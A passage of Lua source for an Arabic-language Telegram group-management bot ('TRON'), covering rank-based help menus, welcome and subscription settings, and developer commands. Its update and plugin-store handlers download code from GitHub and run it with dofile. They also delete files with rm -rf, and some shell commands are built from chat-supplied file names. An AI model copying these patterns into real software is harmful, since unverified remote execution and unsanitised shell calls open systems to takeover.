┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م2" and SecondSudo(msg) or text == "تعيين امر م٢" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م2) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help21'..msg.sender_user_id_)
if TRONTEAM == 'msg' then
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help21'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help2', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م2" or text == "م٢" or text == "اوامر2" or text == "اوامر٢" then
if not Admin(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbd:get(TRON..'Abd:Help2')
local Text = [[
⌁︙اوامر الادمنيه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙الاعدادت
⌁︙تاك للكل 
⌁︙انشاء رابط
⌁︙ضع وصف
⌁︙ضع رابط
⌁︙ضع صوره
⌁︙حذف الرابط
⌁︙حذف المطايه
⌁︙كشف البوتات
⌁︙طرد البوتات
⌁︙تنظيف + العدد
⌁︙تنظيف التعديل
⌁︙كللهم + الكلمه
⌁︙اسم البوت + الامر
⌁︙ضع • حذف ↫ ترحيب
⌁︙ضع • حذف ↫ قوانين
⌁︙اضف • حذف ↫ صلاحيه
⌁︙الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙ضع سبام + العدد
⌁︙ضع تكرار + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع مميز • تنزيل مميز
⌁︙المميزين • حذف المميزين
⌁︙كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙حذف • مسح + بالرد
⌁︙منع • الغاء منع
⌁︙قائمه المنع
⌁︙حذف قائمه المنع
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ الرابط
⌁︙تفعيل • تعطيل ↫ الالعاب
⌁︙تفعيل • تعطيل ↫ الترحيب
⌁︙تفعيل • تعطيل ↫ التاك للكل
⌁︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙طرد المحذوفين
⌁︙طرد ↫ بالرد • بالمعرف • بالايدي
⌁︙كتم • الغاء كتم
⌁︙تقيد • الغاء تقيد
⌁︙حظر • الغاء حظر
⌁︙المكتومين • حذف المكتومين
⌁︙المقيدين • حذف المقيدين
⌁︙المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تقييد دقيقه + عدد الدقائق
⌁︙تقييد ساعه + عدد الساعات
⌁︙تقييد يوم + عدد الايام
⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م3" and SecondSudo(msg) or text == "تعيين امر م٣" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م3) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help31'..msg.sender_user_id_)
if TRONTEAM == 'msg' then
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help31'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help3', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م3" or text == "م٣" or text == "اوامر3" or text == "اوامر٣" then
if not Admin(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbd:get(TRON..'Abd:Help3')
local Text = [[
⌁︙اوامر المدراء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙فحص البوت
⌁︙ضع اسم + الاسم
⌁︙اضف • حذف ↫ رد
⌁︙ردود المدير
⌁︙حذف ردود المدير
⌁︙اضف • حذف ↫ رد متعدد
⌁︙حذف رد من متعدد
⌁︙الردود المتعدده
⌁︙حذف الردود المتعدده
⌁︙حذف قوائم المنع
⌁︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
⌁︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙رفع ادمن • تنزيل ادمن
⌁︙الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تثبيت
⌁︙الغاء التثبيت
⌁︙اعاده التثبيت
⌁︙الغاء تثبيت الكل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغير رد + اسم الرتبه + النص ↫ ⤈
⌁︙المطور • منشئ الاساسي
⌁︙المنشئ • المدير • الادمن
⌁︙المميز • المنظف • العضو
⌁︙حذف ردود الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغيير الايدي ↫ لتغيير الكليشه
⌁︙تعيين الايدي ↫ لتعيين الكليشه
⌁︙حذف الايدي ↫ لحذف الكليشه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل + الامر ↫ ⤈
⌁︙اطردني • الايدي بالصوره • الابراج
⌁︙معاني الاسماء • اوامر النسب • انطق
⌁︙الايدي • تحويل الصيغ • اوامر التحشيش
⌁︙ردود المدير • ردود المطور • التحقق
⌁︙ضافني • حساب العمر • الزخرفه • غنيلي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م4" and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م4) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help41'..msg.sender_user_id_)
if TRONTEAM == 'msg' then
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help41'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help4', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٤" or text == "م4" or text == "اوامر4" or text == "اوامر٤" then
if not Admin(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbd:get(TRON..'Abd:Help4')
local Text = [[
⌁︙اوامر المنشئين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙الميديا • امسح
⌁︙تعين عدد الحذف
⌁︙ترتيب الاوامر
⌁︙اضف • حذف ↫ امر
⌁︙حذف الاوامر المضافه
⌁︙الاوامر المضافه
⌁︙اضف نقاط ↫ بالرد • بالايدي
⌁︙اضف رسائل ↫ بالرد • بالايدي
⌁︙رفع منظف • تنزيل منظف
⌁︙المنظفين • حذف المنظفين
⌁︙رفع مدير • تنزيل مدير
⌁︙المدراء • حذف المدراء
⌁︙تفعيل • تعطيل + الامر ↫ ⤈
⌁︙نزلني • امسح
⌁︙الحظر • الكتم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙وضع لقب + اللقب
⌁︙تفعيل • تعطيل ↫ الرفع
⌁︙رفع منشئ • تنزيل منشئ
⌁︙المنشئين • حذف المنشئين
⌁︙رفع • تنزيل ↫ مشرف
⌁︙رفع بكل الصلاحيات
⌁︙حذف القوائم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المالكين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ منشئ اساسي
⌁︙حذف المنشئين الاساسيين 
⌁︙المنشئين الاساسيين 
⌁︙حذف جميع الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م5" and SecondSudo(msg) or text == "تعيين امر م٥" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م5) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help51'..msg.sender_user_id_)
if TRONTEAM == 'msg' then
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help51'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help5', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م٥" or text == "م5" or text == "اوامر5" or text == "اوامر٥" then
if not SudoBot(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمطورين فقط', 1, 'md')
else
local Help = DevAbd:get(TRON..'Abd:Help5')
local Text = [[
⌁︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙الكروبات
⌁︙المطورين
⌁︙المشتركين
⌁︙الاحصائيات
⌁︙المجموعات
⌁︙اسم البوت + غادر
⌁︙اسم البوت + تعطيل
⌁︙كشف + -ايدي المجموعه
⌁︙رفع مالك • تنزيل مالك
⌁︙المالكين • حذف المالكين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ مدير عام
⌁︙حذف • المدراء العامين 
⌁︙رفع • تنزيل ↫ ادمن عام
⌁︙حذف • الادمنيه العامين 
⌁︙رفع • تنزيل ↫ مميز عام
⌁︙حذف • المميزين عام 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المطور الاساسي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تحديث
⌁︙الملفات
⌁︙المتجر
⌁︙السيرفر
⌁︙روابط الكروبات
⌁︙تحديث السورس
⌁︙تنظيف الكروبات
⌁︙تنظيف المشتركين
⌁︙حذف جميع الملفات
⌁︙تعيين الايدي العام
⌁︙تغير المطور الاساسي
⌁︙حذف معلومات الترحيب
⌁︙تغير معلومات الترحيب
⌁︙غادر + -ايدي المجموعه
⌁︙تعيين عدد الاعضاء + العدد
⌁︙حظر عام • الغاء العام
⌁︙كتم عام • الغاء العام
⌁︙قائمه العام • حذف قائمه العام
⌁︙وضع • حذف ↫ اسم البوت
⌁︙اضف • حذف ↫ رد عام
⌁︙ردود المطور • حذف ردود المطور
⌁︙تعيين • حذف • جلب ↫ رد الخاص
⌁︙جلب نسخه الكروبات
⌁︙رفع النسخه + بالرد على الملف
⌁︙تعيين • حذف ↫ قناة الاشتراك
⌁︙جلب كليشه الاشتراك
⌁︙تغيير • حذف ↫ كليشه الاشتراك
⌁︙رفع • تنزيل ↫ مطور
⌁︙المطورين • حذف المطورين
⌁︙رفع • تنزيل ↫ مطور ثانوي
⌁︙الثانويين • حذف الثانويين
⌁︙تعيين • حذف ↫ كليشة الايدي
⌁︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل ملف + اسم الملف
⌁︙تعطيل ملف + اسم الملف
⌁︙تفعيل • تعطيل + الامر ↫ ⤈
⌁︙الاذاعه • الاشتراك الاجباري
⌁︙ترحيب البوت • المغادره
⌁︙البوت الخدمي • التواصل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م6" and SecondSudo(msg) or text == "تعيين امر م٦" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م6) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help61'..msg.sender_user_id_)
if TRONTEAM == 'msg' then
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help61'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help6', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٦" or text == "م6" or text == "اوامر6" or text == "اوامر٦" then
local Help = DevAbd:get(TRON..'Abd:Help6')
local Text = [[
⌁︙اوامر الاعضاء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙السورس • موقعي • رتبتي • معلوماتي 
⌁︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
⌁︙رسائلي • حذف رسائلي • اسمي • معرفي 
⌁︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
⌁︙نقاطي • بيع نقاطي • القوانين • زخرفه 
⌁︙رابط الحذف • نزلني • اطردني • المطور 
⌁︙منو ضافني • مشاهدات المنشور • الرابط 
⌁︙ايدي المجموعه • معلومات المجموعه 
⌁︙نسبه الحب • نسبه الكره • نسبه الغباء 
⌁︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙لقبه + بالرد
⌁︙كول + الكلمه
⌁︙زخرفه + اسمك
⌁︙برج + نوع البرج
⌁︙معنى اسم + الاسم
⌁︙بوسه • بوسها ↫ بالرد
⌁︙احسب + تاريخ ميلادك
⌁︙رفع مطي • تنزيل مطي • المطايه
⌁︙هينه • هينها ↫ بالرد • بالمعرف
⌁︙صيحه • صيحها ↫ بالرد • بالمعرف
⌁︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
⌁︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
⌁︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
⌁︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end
--     Source TRON     --
if SecondSudo(msg) then
if text == "تحديث السورس" or text == "تحديث سورس" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس ترون', 1, 'md') 
os.execute('rm -rf TRON.lua') 
os.execute('wget https://raw.githubusercontent.com/TRONTEAM/TRON/master/TRON.lua') 
dofile('TRON.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌁' then  
dofile('TRON.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
end 
--     Source TRON     --
if text == 'الملفات' then
Files = '\n⌁︙الملفات المفعله في البوت ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = '⌁︙لا توجد ملفات في البوت'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "متجر الملفات" or text == 'المتجر' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TRONTEAM/TRONFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⌁︙قائمة ملفات متجر سورس ترون\n⌁︙الملفات المتوفره حاليا ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
local TextE = "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙علامة ↫ (✔) تعني الملف مفعل\n⌁︙علامة ↫ (✖️) تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(✔)"
else
CheckFile = "(✖️)"
end
NumFile = NumFile + 1
TextS = TextS.."⌁︙"..Info..' ↫ ⤈\n'..NumFile.."~ : `"..name..'` ↬ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"⌁︙لا يوجد اتصال من الـapi") 
end
end
if text == "مسح جميع الملفات" or text == "حذف جميع الملفات" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"⌁︙تم حذف جميع الملفات المفعله")
end
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/TRONTEAM/TRONFiles/master/TRONFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\n⌁︙الملف ↫ *"..FileName.."*\n⌁︙تم تعطيله وحذفه من البوت بنجاح") 
dofile('TRON.lua')  
else
send(msg.chat_id_, msg.id_,"⌁︙لا يوجد ملف بهذا الاسم") 
end
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/TRONTEAM/TRONFiles/master/TRONFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n⌁︙الملف ↫ *"..FileName.."*\n⌁︙تم تفعيله في البوت بنجاح") 
dofile('TRON.lua')  
else
send(msg.chat_id_, msg.id_,"⌁︙لا يوجد ملف بهذا الاسم") 
end
return false
end
end 
--     Source TRON     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) then    
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف معلومات الترحيب', 1, 'md')   
DevAbd:del(TRON..'Abd:Text:BotWelcome')
DevAbd:del(TRON..'Abd:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب') and SecondSudo(msg) then    
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevAbd:del(TRON..'Abd:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب') and SecondSudo(msg) then    
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevAbd:set(TRON..'Abd:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب ⌁') and SecondSudo(msg) then    
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي نص الترحيب', 1, 'md') 
DevAbd:del(TRON..'Abd:Text:BotWelcome')
DevAbd:del(TRON..'Abd:Photo:BotWelcome')
DevAbd:set(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevAbd:get(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
DevAbd:del(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص ارسل لي صورة الترحيب\n⌁︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevAbd:set(TRON.."Abd:Text:BotWelcome",text) 
DevAbd:set(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevAbd:get(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevAbd:del(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevAbd:set(TRON.."Abd:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص وصورة الترحيب", 1, 'md')   
DevAbd:del(TRON.."Abd:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source TRON     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة المطور الان ", 1, "md")
DevAbd:setex(TRON.."Abd:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف كليشة المطور", 1, "md")
DevAbd:del(TRON.."DevText")
end end
--     Source TRON     --
if DevAbd:get(TRON.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
DevAbd:del(TRON.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbd:del(TRON.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAbd:set(TRON..'Abd:ChText',texxt)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغير كليشه الاشتراك$") and SecondSudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and SecondSudo(msg) then  
DevAbd:setex(TRON.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
local text = '⌁︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_Abd(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbd:del(TRON..'Abd:ChText')
textt = "⌁︙تم حذف كليشة الاشتراك الاجباري"
Dev_Abd(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevAbd:get(TRON.."Abd:ChText")
if chtext then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙كليشة الاشتراك ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
else
if DevAbd:get(TRON.."Abd:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbd:get(TRON.."Abd:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "⌁︙عذرا لاتستطيع استخدام البوت !\n⌁︙عليك الاشتراك في القناة اولا :"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     Source TRON     --
if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ [@YYYYAX]', 1, 'md')    
end 
--     Source TRON     --
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
if not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '⌁︙نظام التشغيل ↫ ⤈\n`'"$LinuxVersion"'`' 
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الذاكره العشوائيه ↫ ⤈\n`'"$MemoryUsage"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙مدة تشغيل السيرفر ↫ ⤈\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source TRON     --
TRONFiles(msg)
--     Source TRON     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevAbd:incr(TRON..'Abd:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'الميديا'
if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
elseif result.content_.ID == "MessageSticker" then Media = 'الملصق'
elseif result.content_.ID == "MessageVoice" then Media = 'البصمه'
elseif result.content_.ID == "MessageAudio" then Media = 'الصوت'
